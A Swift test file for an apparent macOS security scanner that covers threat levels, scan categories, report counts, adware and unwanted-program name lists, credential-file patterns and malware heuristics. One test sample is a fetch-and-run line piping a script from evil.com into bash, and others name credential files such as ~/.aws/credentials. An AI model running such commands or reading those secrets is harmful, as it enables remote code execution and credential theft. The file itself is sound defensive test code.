// SecurityScannerTests.swift
// Tests for SecurityScanner types and logic
// SPM-compatible — uses standalone test doubles mirroring production types

import Testing
import Foundation

// MARK: - Test Doubles

private enum TestThreatLevel: String, Codable, Comparable {
    case clean = "Clean"
    case low = "Low Risk"
    case medium = "Medium Risk"
    case high = "High Risk"
    case critical = "Critical"

    var icon: String {
        switch self {
        case .clean: "checkmark.shield.fill"
        case .low: "shield.fill"
        case .medium: "exclamationmark.shield.fill"
        case .high: "xmark.shield.fill"
        case .critical: "exclamationmark.triangle.fill"
        }
    }

    static func < (lhs: TestThreatLevel, rhs: TestThreatLevel) -> Bool {
        let order: [TestThreatLevel] = [.clean, .low, .medium, .high, .critical]
        return (order.firstIndex(of: lhs) ?? 0) < (order.firstIndex(of: rhs) ?? 0)
    }
}

private enum TestScanCategory: String, CaseIterable, Codable {
    case malware = "Malware"
    case adware = "Adware"
    case pup = "Potentially Unwanted Programs"
    case privacy = "Privacy Risks"
    case network = "Network Security"
    case permissions = "Permissions Audit"
    case credentials = "Credentials"
    case systemIntegrity = "System Integrity"

    var icon: String {
        switch self {
        case .malware: "ladybug.fill"
        case .adware: "megaphone.fill"
        case .pup: "exclamationmark.bubble.fill"
        case .privacy: "eye.slash.fill"
        case .network: "network"
        case .permissions: "lock.shield.fill"
        case .credentials: "key.fill"
        case .systemIntegrity: "cpu"
        }
    }

    var description: String {
        switch self {
        case .malware: "Scan for known malware signatures and suspicious binaries"
        case .adware: "Detect advertising frameworks and browser hijackers"
        case .pup: "Find potentially unwanted programs and bundleware"
        case .privacy: "Audit apps for privacy violations and tracking"
        case .network: "Check network configuration for vulnerabilities"
        case .permissions: "Review app permissions (camera, mic, location, contacts)"
        case .credentials: "Find exposed credentials and weak passwords"
        case .systemIntegrity: "Verify system file integrity and code signing"
        }
    }
}

private struct TestSecurityFinding: Codable, Identifiable {
    let id: UUID
    let category: TestScanCategory
    let threatLevel: TestThreatLevel
    let title: String
    let description: String
    let filePath: String?
    let recommendation: String
    let detectedAt: Date

    init(
        category: TestScanCategory,
        threatLevel: TestThreatLevel,
        title: String,
        description: String,
        filePath: String? = nil,
        recommendation: String
    ) {
        self.id = UUID()
        self.category = category
        self.threatLevel = threatLevel
        self.title = title
        self.description = description
        self.filePath = filePath
        self.recommendation = recommendation
        self.detectedAt = Date()
    }
}

private struct TestScanReport: Codable, Identifiable {
    let id: UUID
    let findings: [TestSecurityFinding]
    let scanDuration: TimeInterval
    let categoriesScanned: [TestScanCategory]
    let filesScanned: Int
    let startedAt: Date
    let completedAt: Date

    var overallThreatLevel: TestThreatLevel {
        findings.max(by: { $0.threatLevel < $1.threatLevel })?.threatLevel ?? .clean
    }

    var findingsByCategory: [TestScanCategory: [TestSecurityFinding]] {
        Dictionary(grouping: findings, by: \.category)
    }

    var criticalCount: Int { findings.filter { $0.threatLevel == .critical }.count }
    var highCount: Int { findings.filter { $0.threatLevel == .high }.count }
    var mediumCount: Int { findings.filter { $0.threatLevel == .medium }.count }
    var lowCount: Int { findings.filter { $0.threatLevel == .low }.count }
}

// MARK: - Tests

@Suite("ThreatLevel")
struct ThreatLevelTests {
    @Test func ordering() {
        #expect(TestThreatLevel.clean < TestThreatLevel.low)
        #expect(TestThreatLevel.low < TestThreatLevel.medium)
        #expect(TestThreatLevel.medium < TestThreatLevel.high)
        #expect(TestThreatLevel.high < TestThreatLevel.critical)
    }

    @Test func notReversed() {
        #expect(!(TestThreatLevel.critical < TestThreatLevel.clean))
        #expect(!(TestThreatLevel.high < TestThreatLevel.low))
    }

    @Test func equality() {
        #expect(!(TestThreatLevel.medium < TestThreatLevel.medium))
    }

    @Test func uniqueIcons() {
        let levels: [TestThreatLevel] = [.clean, .low, .medium, .high, .critical]
        let icons = levels.map(\.icon)
        #expect(Set(icons).count == icons.count)
    }

    @Test func uniqueRawValues() {
        let levels: [TestThreatLevel] = [.clean, .low, .medium, .high, .critical]
        let raw = levels.map(\.rawValue)
        #expect(Set(raw).count == raw.count)
    }

    @Test func codableRoundtrip() throws {
        for level in [TestThreatLevel.clean, .low, .medium, .high, .critical] {
            let data = try JSONEncoder().encode(level)
            let decoded = try JSONDecoder().decode(TestThreatLevel.self, from: data)
            #expect(decoded == level)
        }
    }

    @Test func maxThreat() {
        let levels: [TestThreatLevel] = [.low, .critical, .medium, .clean]
        let max = levels.max()
        #expect(max == .critical)
    }

    @Test func minThreat() {
        let levels: [TestThreatLevel] = [.medium, .high, .low]
        let min = levels.min()
        #expect(min == .low)
    }
}

@Suite("ScanCategory")
struct ScanCategoryTests {
    @Test func allCases() {
        #expect(TestScanCategory.allCases.count == 8)
    }

    @Test func uniqueRawValues() {
        let raw = TestScanCategory.allCases.map(\.rawValue)
        #expect(Set(raw).count == raw.count)
    }

    @Test func uniqueIcons() {
        let icons = TestScanCategory.allCases.map(\.icon)
        #expect(Set(icons).count == icons.count)
    }

    @Test func descriptionsNonEmpty() {
        for cat in TestScanCategory.allCases {
            #expect(!cat.description.isEmpty)
        }
    }

    @Test func codableRoundtrip() throws {
        for cat in TestScanCategory.allCases {
            let data = try JSONEncoder().encode(cat)
            let decoded = try JSONDecoder().decode(TestScanCategory.self, from: data)
            #expect(decoded == cat)
        }
    }
}

@Suite("SecurityScannerFinding")
struct SecurityScannerFindingTests {
    @Test func creation() {
        let finding = TestSecurityFinding(
            category: .malware,
            threatLevel: .high,
            title: "Suspicious Agent",
            description: "curl+bash pattern detected",
            filePath: "/Library/LaunchAgents/com.evil.plist",
            recommendation: "Remove the plist file"
        )
        #expect(finding.category == .malware)
        #expect(finding.threatLevel == .high)
        #expect(finding.title == "Suspicious Agent")
        #expect(finding.filePath == "/Library/LaunchAgents/com.evil.plist")
    }

    @Test func nilFilePath() {
        let finding = TestSecurityFinding(
            category: .network,
            threatLevel: .medium,
            title: "Firewall Disabled",
            description: "Built-in firewall is off",
            recommendation: "Enable firewall"
        )
        #expect(finding.filePath == nil)
    }

    @Test func uniqueIDs() {
        let a = TestSecurityFinding(category: .malware, threatLevel: .high, title: "A", description: "A", recommendation: "A")
        let b = TestSecurityFinding(category: .malware, threatLevel: .high, title: "A", description: "A", recommendation: "A")
        #expect(a.id != b.id)
    }

    @Test func codableRoundtrip() throws {
        let finding = TestSecurityFinding(
            category: .credentials,
            threatLevel: .high,
            title: "Exposed Credentials",
            description: "AWS keys in plaintext",
            filePath: "~/.aws/credentials",
            recommendation: "Use Keychain"
        )
        let data = try JSONEncoder().encode(finding)
        let decoded = try JSONDecoder().decode(TestSecurityFinding.self, from: data)
        #expect(decoded.category == .credentials)
        #expect(decoded.threatLevel == .high)
        #expect(decoded.title == "Exposed Credentials")
    }
}

@Suite("ScanReport")
struct ScanReportTests {
    @Test func emptyReport() {
        let report = TestScanReport(
            id: UUID(), findings: [], scanDuration: 1.5,
            categoriesScanned: TestScanCategory.allCases, filesScanned: 100,
            startedAt: Date(), completedAt: Date()
        )
        #expect(report.overallThreatLevel == .clean)
        #expect(report.criticalCount == 0)
        #expect(report.highCount == 0)
        #expect(report.mediumCount == 0)
        #expect(report.lowCount == 0)
        #expect(report.findingsByCategory.isEmpty)
    }

    @Test func overallThreatLevelPicksHighest() {
        let findings = [
            TestSecurityFinding(category: .malware, threatLevel: .low, title: "A", description: "A", recommendation: "A"),
            TestSecurityFinding(category: .network, threatLevel: .critical, title: "B", description: "B", recommendation: "B"),
            TestSecurityFinding(category: .privacy, threatLevel: .medium, title: "C", description: "C", recommendation: "C")
        ]
        let report = TestScanReport(
            id: UUID(), findings: findings, scanDuration: 5.0,
            categoriesScanned: [.malware, .network, .privacy], filesScanned: 50,
            startedAt: Date(), completedAt: Date()
        )
        #expect(report.overallThreatLevel == .critical)
    }

    @Test func countsByLevel() {
        let findings = [
            TestSecurityFinding(category: .malware, threatLevel: .critical, title: "1", description: "1", recommendation: "1"),
            TestSecurityFinding(category: .malware, threatLevel: .critical, title: "2", description: "2", recommendation: "2"),
            TestSecurityFinding(category: .network, threatLevel: .high, title: "3", description: "3", recommendation: "3"),
            TestSecurityFinding(category: .privacy, threatLevel: .medium, title: "4", description: "4", recommendation: "4"),
            TestSecurityFinding(category: .credentials, threatLevel: .low, title: "5", description: "5", recommendation: "5"),
            TestSecurityFinding(category: .credentials, threatLevel: .low, title: "6", description: "6", recommendation: "6")
        ]
        let report = TestScanReport(
            id: UUID(), findings: findings, scanDuration: 10.0,
            categoriesScanned: TestScanCategory.allCases, filesScanned: 200,
            startedAt: Date(), completedAt: Date()
        )
        #expect(report.criticalCount == 2)
        #expect(report.highCount == 1)
        #expect(report.mediumCount == 1)
        #expect(report.lowCount == 2)
    }

    @Test func findingsByCategory() {
        let findings = [
            TestSecurityFinding(category: .malware, threatLevel: .high, title: "Mal1", description: "D", recommendation: "R"),
            TestSecurityFinding(category: .malware, threatLevel: .medium, title: "Mal2", description: "D", recommendation: "R"),
            TestSecurityFinding(category: .network, threatLevel: .low, title: "Net1", description: "D", recommendation: "R")
        ]
        let report = TestScanReport(
            id: UUID(), findings: findings, scanDuration: 3.0,
            categoriesScanned: [.malware, .network], filesScanned: 30,
            startedAt: Date(), completedAt: Date()
        )
        #expect(report.findingsByCategory[.malware]?.count == 2)
        #expect(report.findingsByCategory[.network]?.count == 1)
        #expect(report.findingsByCategory[.privacy] == nil)
    }

    @Test func codableRoundtrip() throws {
        let finding = TestSecurityFinding(category: .systemIntegrity, threatLevel: .critical, title: "SIP Off", description: "D", recommendation: "R")
        let report = TestScanReport(
            id: UUID(), findings: [finding], scanDuration: 2.5,
            categoriesScanned: [.systemIntegrity], filesScanned: 3,
            startedAt: Date(), completedAt: Date()
        )
        let data = try JSONEncoder().encode(report)
        let decoded = try JSONDecoder().decode(TestScanReport.self, from: data)
        #expect(decoded.findings.count == 1)
        #expect(decoded.filesScanned == 3)
        #expect(decoded.overallThreatLevel == .critical)
    }

    @Test func historyLimit() {
        var history: [TestScanReport] = []
        for _ in 0..<55 {
            history.append(TestScanReport(
                id: UUID(), findings: [], scanDuration: 1.0,
                categoriesScanned: [], filesScanned: 0,
                startedAt: Date(), completedAt: Date()
            ))
        }
        if history.count > 50 {
            history = Array(history.suffix(50))
        }
        #expect(history.count == 50)
    }
}

@Suite("Known Patterns")
struct KnownPatternsTests {
    private let knownAdware: Set<String> = [
        "com.genieo", "com.crossrider", "com.operatorMac",
        "com.vsearch", "com.conduit", "com.spigot",
        "com.installmac", "com.mackeeper", "com.advanced-mac-cleaner",
        "com.zeobit.MacKeeper"
    ]

    private let pupIndicators: [String] = [
        "MacKeeper", "CleanMyMac X", "Advanced Mac Cleaner",
        "Mac Auto Fixer", "Mac Tonic", "Smart Mac Booster"
    ]

    @Test func adwareCount() {
        #expect(knownAdware.count == 10)
    }

    @Test func adwareDetection() {
        #expect(knownAdware.contains("com.mackeeper"))
        #expect(knownAdware.contains("com.genieo"))
        #expect(!knownAdware.contains("com.apple.Safari"))
    }

    @Test func pupDetection() {
        let appName = "MacKeeper"
        let isPUP = pupIndicators.contains(where: { appName.localizedCaseInsensitiveContains($0) })
        #expect(isPUP)
    }

    @Test func pupNoFalsePositive() {
        let appName = "Safari"
        let isPUP = pupIndicators.contains(where: { appName.localizedCaseInsensitiveContains($0) })
        #expect(!isPUP)
    }

    @Test func pupCaseInsensitive() {
        let appName = "mackeeper"
        let isPUP = pupIndicators.contains(where: { appName.localizedCaseInsensitiveContains($0) })
        #expect(isPUP)
    }

    @Test func credentialPatternsMatching() {
        let patterns: [(path: String, pattern: String)] = [
            ("/.netrc", "password"),
            ("/.aws/credentials", "aws_secret_access_key"),
            ("/.npmrc", "//registry.npmjs.org/:_authToken"),
            ("/.gitconfig", "password")
        ]

        // Simulate content check
        let fileContent = "machine github.com\nlogin user\npassword secret123"
        let matched = patterns.filter { fileContent.localizedCaseInsensitiveContains($0.pattern) }
        #expect(matched.count == 2) // matches "password" in .netrc and .gitconfig entries
    }
}

@Suite("Malware Detection Logic")
struct MalwareDetectionTests {
    @Test func curlBashPattern() {
        let content = "#!/bin/bash\ncurl -s https://evil.com/payload.sh | bash"
        let isSuspicious = content.contains("curl") && content.contains("bash")
        #expect(isSuspicious)
    }

    @Test func hiddenFileReference() {
        let content = "<key>ProgramArguments</key><string>/tmp/.hidden_binary</string>"
        let isSuspicious = content.contains("/tmp/.") || content.contains("/var/tmp/.")
        #expect(isSuspicious)
    }

    @Test func noFalsePositiveOnNormalPlist() {
        let content = "<key>Label</key><string>com.apple.mdworker</string><key>ProgramArguments</key><string>/usr/libexec/mdworker</string>"
        let hasCurlBash = content.contains("curl") && content.contains("bash")
        let hasHidden = content.contains("/tmp/.") || content.contains("/var/tmp/.")
        #expect(!hasCurlBash)
        #expect(!hasHidden)
    }

    @Test func sshStrictHostKeyCheck() {
        let config = "Host *\n  StrictHostKeyChecking no\n  IdentityFile ~/.ssh/id_rsa"
        #expect(config.contains("StrictHostKeyChecking no"))
    }

    @Test func sshStrictHostKeyCheckSafe() {
        let config = "Host *\n  StrictHostKeyChecking yes\n  IdentityFile ~/.ssh/id_rsa"
        #expect(!config.contains("StrictHostKeyChecking no"))
    }

    @Test func sipDisabledDetection() {
        let output = "System Integrity Protection status: disabled."
        #expect(output.contains("disabled"))
    }

    @Test func sipEnabledDetection() {
        let output = "System Integrity Protection status: enabled."
        #expect(!output.contains("disabled"))
    }

    @Test func fileVaultDetection() {
        let output = "FileVault is Off."
        #expect(output.contains("FileVault is Off"))
    }

    @Test func gatekeeperDetection() {
        let output = "assessments disabled"
        #expect(output.contains("disabled"))
    }
}

@Suite("File Size Formatting")
struct SecurityFileSizeTests {
    private func formatFileSize(_ bytes: Int64) -> String {
        let units = ["B", "KB", "MB", "GB"]
        var value = Double(bytes)
        var unitIndex = 0
        while value >= 1024 && unitIndex < units.count - 1 {
            value /= 1024
            unitIndex += 1
        }
        return unitIndex == 0 ? "\(bytes) B" : String(format: "%.1f %@", value, units[unitIndex])
    }

    @Test func bytes() {
        #expect(formatFileSize(100) == "100 B")
    }

    @Test func megabytes() {
        #expect(formatFileSize(10_485_760) == "10.0 MB")
    }

    @Test func largeTracking() {
        let size: Int64 = 15_000_000
        let isLarge = size > 10_000_000
        #expect(isLarge)
    }
}
